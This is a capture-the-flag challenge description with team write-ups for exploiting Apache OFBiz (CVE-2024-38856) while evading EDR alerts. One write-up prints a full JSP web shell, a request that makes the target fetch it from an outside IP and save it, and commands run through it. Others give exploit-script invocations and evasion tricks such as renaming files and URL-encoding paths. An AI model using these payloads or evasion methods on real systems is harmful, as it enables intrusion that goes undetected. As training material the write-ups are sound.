## Teams
teams(("junior", 4), ("senior", 4), ("open", 7))) + team_at
## Challenge Description
``````
name: "stealthctf"
author: "AIT"
category: misc
description: |
  Your goal is not only to pwn this machine, but to do it stealthily. A set of EDR systems are monitoring the machine
  and your score will be calculated based on the alert score you generate. The more stealthy you are, the less alerts
  you will generate and the more points you will score.
  You can submit flags for this challenge multiple times, so you can try different approaches to get the flag and improve
  your score.

  The flag you find by exploiting the system can not be directly submitted to CTFd. It first has to be sumbitted to
  the check-script that is running on port 1881 of the target machine. Only one connection to this script is possible,
  after submission the machine will gather all logs, evluate them, give you the final flag, restart and wipe.

  This final flag can then be submitted here on CTFd.
  DO NOT FORGET THIS STEP, THE POINTS WILL ONLY BE AWARDED IF YOU SUBMIT THE FLAG TO THE CTF BACKEND.

  Disclaimers:
  - Do not play around with the checkscript (port 1881), it is specifically out of scope.
  - Do not try to get root on the system.
  - Do not try to fill the disk with logfiles.

  When you have successfully submitted a flag it is **REQUIRED** for you to open a ticket and submit your payload that
  you've used to get the flag (or a short description how you got the flag) and your strategy to evade detection.
  Please also add your contact addresses to the ticket if you want to take part in the AIT Stealth-Cup. (see link)
  If you submit a new flag make sure to also submit the new payload / short description to the existing ticket.

  The following formula is used to calculate the points you get for this challenge depending on the alert score:
  ```py
  def calculate_ctf_points(alert_score, max_points=500, min_points=100, steepness=.1):
      decay_factor = steepness * math.log(x)
      points_awarded = max_points - decay_factor * (max_points - min_points)
      return int(max(min_points, points_awarded))
  ```
value: 500

flags: [] # flags are encrypted points

topics:
  - pwn
  - stealth
  - red-teaming

tags:
  - medium
  
``````

FIX:

When you have successfully submitted a flag it is **REQUIRED** for you to open a ticket and submit your payload that  you've used to get the flag (or a short description how you got the flag) and your strategy to evade detection. **Please also not any other interesting bugs you've detected, or any CVE you plan to file. If you plan to do it and don't want to release any information right now, please leave us your contact address.**  Please also add your contact addresses to the ticket if you want to take part in the AIT Stealth-Cup. (see link) If you submit a new flag make sure to also submit the new payload / short description to the existing ticket.

## Writeups
In total 4 writeups:
* Senior 2
* Open 4

## open_4 (open_4 15:56 Solution provided! 13)
Short writeup for the stealthctf challenge. (Try #1)
Generally, we're exploiting an outdated and vulnerable version of Apache OFBiz. Exploitation works by following this (https://qkl.seebug.org/vuldb/ssvid-99874) blogpost.
Now to avoid detection, we replaced "rce" and other sus names with "test". This resulted in 2 alerts. Files and requests used for this can be found below.

testreport.csv
```
<%@ page import='java.io.*' %><%@ page import='java.util.*' %><h1>Ahoy!</h1><br><% String getcmd = request.getParameter("cmd"); if (getcmd != null) { out.println("Command: " + getcmd + "<br>"); String cmd1 = "/bin/sh"; String cmd2 = "-c"; String cmd3 = getcmd; String[] cmd = new String[3]; cmd[0] = cmd1; cmd[1] = cmd2; cmd[2] = cmd3; Process p = Runtime.getRuntime().exec(cmd); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine();}} %>,
```

testschema.xml
```
<data-files xsi:noNamespaceSchemaLocation="http://ofbiz.apache.org/dtds/datafiles.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <data-file name="test" separator-style="fixed-length" type-code="text" start-line="0" encoding-type="UTF-8">
        <record name="testentry" limit="many">
            <field name="jsp" type="String" length="605" position="0"></field>
        </record>
    </data-file>
</data-files>
```

Request 1
```
POST /webtools/control/forgotPassword/viewdatafile HTTP/1.1
Host: lqmgnhaz5z5poykg.chal.acsc.land
User-Agent: curl/7.81.0
Accept: */*
Content-Length: 262
Content-Type: application/x-www-form-urlencoded

DATAFILE_LOCATION=http://18.197.60.155/testreport.csv?DATAFILE&DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&DATAFILE_IS_URL=true&DEFINITION_LOCATION=http://18.197.60.155/testschema.xml?DEFINITION&DEFINITION_IS_URL=true&DEFINITION_NAME=test
```

Request 2
```
GET /accounting/index.jsp?cmd=cat%20flag HTTP/1.1
Host: lqmgnhaz5z5poykg.chal.acsc.land
Cookie: JSESSIONID=EF7D9A794846A6FB7A91A902E2877EC6.jvm1

```

Alert output
```
nc port.chal.acsc.land 31049
Please input flag. If you believe something is wrong you can enter reset.
K1T2vVHkMr1Bn4fiVtFEeQIX
correct, calculating results
2024-09-18 13:56:35 stuff packed
** Alert 1726667688.0: - ossec,pci_dss_10.6.1,gpg13_10.1,gdpr_IV_35.7.d,hipaa_164.312.b,nist_800_53_AU.6,tsc_CC7.2,tsc_CC7.3,
2024 Sep 18 13:54:48 stealthctf-6cfb586778-xg5ql->wazuh-monitord
Rule: 502 (level 3) -> 'Wazuh server started.'
ossec: Manager started.

** Alert 1726667741.263: - web,accesslog,attack,pci_dss_6.5,pci_dss_11.4,gdpr_IV_35.7.d,nist_800_53_SA.11,nist_800_53_SI.4,tsc_CC6.6,tsc_CC7.1,tsc_CC8.1,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,
2024 Sep 18 13:55:41 stealthctf-6cfb586778-xg5ql->/var/log/apache2/access.log
Rule: 31101 (level 5) -> 'Web server 400 error code.'
Src IP: 192.168.116.211
192.168.116.211 - - [18/Sep/2024:13:55:41 +0000] "GET / HTTP/1.1" 404 2350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36"

** Alert 1726667743.812: - web,accesslog,attack,pci_dss_6.5,pci_dss_11.4,gdpr_IV_35.7.d,nist_800_53_SA.11,nist_800_53_SI.4,tsc_CC6.6,tsc_CC7.1,tsc_CC8.1,tsc_CC6.1,tsc_CC6.8,tsc_CC7.2,tsc_CC7.3,
2024 Sep 18 13:55:43 stealthctf-6cfb586778-xg5ql->/var/log/ids/ofbiz/access_log..2024-09-18
Rule: 31101 (level 5) -> 'Web server 400 error code.'
Src IP: 127.0.0.1
127.0.0.1 - - [18/Sep/2024:13:55:41 +0000] "GET / HTTP/1.1" 404 682 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36"

You had 2 alerts and a score of 10 (the lower the better ;)) ... Here is your final flag (you don't need 'ACSC{}' for this flag!):

        U2FsdGVkX19LE3/H+KoRJpIybZ56jhNJwABtDChxrsg=

2024-09-18 13:56:35 results printed
```

### senior_2 (senior_2 16:28 Solution provided! 139)
Writeup stealthctf 
#### Introduction 
We were given a https link which displays a tomcat error message. Additionaly we were given the hint that there could be possible ofbiz vulnerabilities. After some googling we found CVE-2024-38856. https://blog.sonicwall.com/en-us/2024/08/sonicwall-discovers-second-critical-apache-ofbiz-zero-day-vulnerability/ The vulnerability is to abuse the incorrect viewstate permission checks. ## Exploit After some more googling we found a vuln scanner and exploit script for this CVE. https://github.com/securelayer7/CVE-2024-38856_Scanner/tree/main Display the file contents with ls: ```bash python vuln.py -t https://9b32m4fgmfhux15o.chal.acsc.land:443/ -c "ls" --exploit ``` We see that there is flag file. ```bash python vuln.py -t https://9b32m4fgmfhux15o.chal.acsc.land:443/ -c "cat flag" --exploit ``` Flag file content: 6leM3I2YHCED92HOA2UuEG3O We then submitted it to the provided endpoint and got the flag: ```bash nc port.chal.acsc.land 30203 ``` Flag: U2FsdGVkX1+rX2uTSF+AvxXMtXQjUhgr5bg9DKpWOdY= 
#### Evasion techniques 

We didn't do any sophisticated evasion technuiqes. We just printed the flag with cat.
### senior_2 (senior_2 14:51 Solution provided! 27)
#### Introduction

We were given a https link which displays a tomcat error message.

Additionaly we were given the hint that there could be possible ofbiz vulnerabilities.

After some googling we found CVE-2024-38856.https://blog.sonicwall.com/en-us/2024/08/sonicwall-discovers-second-critical-apache-ofbiz-zero-day-vulnerability/

The vulnerability is to abuse the incorrect viewstate permission checks.

#### Exploit

After some more googling we found a vuln scanner and exploit script for this CVE.https://github.com/securelayer7/CVE-2024-38856_Scanner/tree/main


Display the file contents with ls:
```bash
python vuln.py -t https://9b32m4fgmfhux15o.chal.acsc.land:443/ -c "ls" --exploit
```

We see that there is flag file.

```bash
python vuln.py -t https://9b32m4fgmfhux15o.chal.acsc.land:443/ -c "cat flag" --exploit
```

Flag file content: 0ZtzeRjxACEq4gIliE0gMrNV

We then submitted it to the provided endpoint and got the flag:

```bash
nc port.chal.acsc.land 30203
```


Flag: U2FsdGVkX1+X8k98f7ic93XUWVIvmOHoMKZAG1lYgpM=

#### Evasion techniques

We tried to do some evasion by changing the request line from the github scanner script:

From:
```
url = f'{target}:{port}/webtools/control/main/ProgramExport'
```

to 

```
url = f'{target}:{port}/webtools/control/forgotPassword/Program%45xport'
```

We used other view components and url encoded part of the path to deter detection of parts of the url.
```
```

### open_4 (open_4 16:50 Solution provided! 3)

So, I managed to get 0 alerts by doing exactly the same as before, but not navigating to "/", since this causes a 404 :)))) (see image 1)
However, when I submitted the flag I got the error seen in image 2
![[Pasted image 20240925125242.png]]
